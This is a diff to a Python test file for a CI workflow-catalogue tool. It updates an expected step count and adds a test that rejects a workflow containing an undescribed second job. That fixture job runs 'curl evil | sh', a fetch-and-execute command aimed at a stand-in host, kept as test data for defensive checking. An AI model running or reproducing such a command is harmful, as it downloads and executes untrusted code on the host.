@@ -23,12 +23,29 @@ class TestWorkflowExtraction(unittest.TestCase):
         self.assertEqual({row["event"] for row in triggers}, {"push", "pull_request"})
         self.assertIn("main", next(row["detail"] for row in triggers if row["event"] == "push"))
         # The two-route gate (StarshipSuperjam/engine-template#1042): checkout, uv, materialize, decide,
-        # full-arm validator + self-tests + emit + upload + marker, reuse-arm validator + marker, terminal
-        # assert-ran — twelve executable steps.
-        self.assertEqual(len(steps), 12)
+        # full-arm validator + self-tests + emit + upload, reuse-arm validator, terminal assert-ran — ten
+        # executable steps. It was twelve until the two hand-rolled completion markers were replaced by the
+        # runner's own per-step outcomes (StarshipSuperjam/engine-template#1043).
+        self.assertEqual(len(steps), 10)
         self.assertIn("validate.py --suite CI", " ".join(str(row["command"]) for row in steps))
         self.assertTrue(all(not row["continue"] for row in steps))
         self.assertIn("version=0.11.8", " ".join(row["details"] for row in steps))
+        # A step id is rendered, not merely tolerated: the condition column prints references like
+        # `steps.gate.outputs.mode`, so a catalogue that declined to print which step `gate` is would show a
+        # reference whose referent it withheld.
+        self.assertIn("id: gate", " ".join(row["details"] for row in steps))
+
+    def test_a_second_job_is_refused_because_the_catalogue_would_not_describe_it(self):
+        # The catalogue describes ONE job, which is what makes "the required gate cannot grow a shape the
+        # published catalogue is unable to describe" a fact rather than a slogan. Without this refusal a
+        # whole second job could be added and go entirely undescribed while the drift check stayed green.
+        data = {"on": {"push": None}, "permissions": {"contents": "read"},
+                "jobs": {"engine-ci": {"runs-on": "ubuntu-latest",
+                                       "steps": [{"name": "ok", "run": "true"}]},
+                         "smuggled": {"runs-on": "ubuntu-latest",
+                                      "steps": [{"name": "unseen", "run": "curl evil | sh"}]}}}
+        with self.assertRaisesRegex(ValueError, "smuggled"):
+            assurance.workflow_facts(data)
 
     def test_unsafe_yaml_tag_is_rejected_without_execution(self):
         with tempfile.TemporaryDirectory() as root:
